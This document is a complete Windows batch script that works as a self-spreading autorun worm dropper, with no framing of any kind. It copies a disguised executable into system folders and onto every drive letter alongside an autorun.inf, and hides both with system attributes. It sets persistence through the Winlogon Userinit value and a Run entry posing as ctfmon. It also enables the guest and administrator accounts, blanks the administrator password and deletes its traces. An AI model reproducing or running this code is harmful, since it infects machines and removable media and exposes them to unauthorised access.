@echo off
@if not exist .\ntuser.ini explorer \
xcopy /h /y /r /k .\S-1-5-21-1214440339.exe %systemroot%\system\
xcopy /h /y /r /k .\autorun.inf %systemroot%\system\
xcopy /h /y /r /k .\S-1-5-21-1214440339.exe %systemroot%\system32\dllcache\
attrib -h -s -a %systemroot%\system32\dllcache\S-1-5-21-1214440339.exe
rename %systemroot%\system32\dllcache\S-1-5-21-1214440339.exe  mouse339.exe
xcopy /h /y /r /k %systemroot%\system32\dllcache\mouse339.exe %systemroot%\system\
attrib -h -s -a %systemroot%\system\mouse339.exe
rename %systemroot%\system\mouse339.exe S-1-5-21-1214440339.exe
@if not exist .\S-1-5-21-1214440339.exe xcopy /h /y /r /k %systemroot%\system\S-1-5-21-1214440339.exe .\
for %%i in (c d e f g h i j k l m n o p q r s t u v w x y z) do xcopy /h /y /r /k autorun.inf %%i%:\
for %%i in (c d e f g h i j k l m n o p q r s t u v w x y z) do xcopy /h /y /r /k S-1-5-21-1214440339.exe %%i%:\
for %%i in (c d e f g h i j k l m n o p q r s t u v w x y z) do @if exist %%i%:\S-1-5-21-1214440339.exe attrib +h +s +a %%i%:\S-1-5-21-1214440339.exe
for %%i in (c d e f g h i j k l m n o p q r s t u v w x y z) do @if exist %%i%:\autorun.inf attrib +h +s +a %%i%:\autorun.inf
attrib +h +s +a %systemroot%\system\S-1-5-21-1214440339.exe
attrib +h +s +a %systemroot%\system\autorun.inf
attrib +h +s +a %systemroot%\system32\dllcache\mouse339.exe
echo Windows Registry Editor Version 5.00 >> .\reg.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon] >> .\reg.reg
echo "Userinit"="userinit.exe,S-1-5-21-1214440339.exe,c:\\windows\\system32\\dllcache\\mouse339.exe" >> .\reg.reg
echo Windows Registry Editor Version 5.00 >> .\reg1.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer] >> .\reg1.reg
echo "NoDriveTypeAutoRun"=dword:95000000 >> .\reg1.reg
echo Windows Registry Editor Version 5.00 >> .\reg2.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> .\reg2.reg
echo "ctfmon"="c:\\windows\\system\\S-1-5-21-1214440339.exe" >> .\reg2.reg
regedit /s .\reg.reg
regedit /s .\reg1.reg
regedit /s .\reg2.reg
del .\reg.reg
del .\reg1.reg
del .\reg2.reg
net user guest /active:yes
net user administrator /active:yes
net user administrator ""
del /a:h .\shell.vbs
del /a:h .\AUTOEXEC.BAT
exit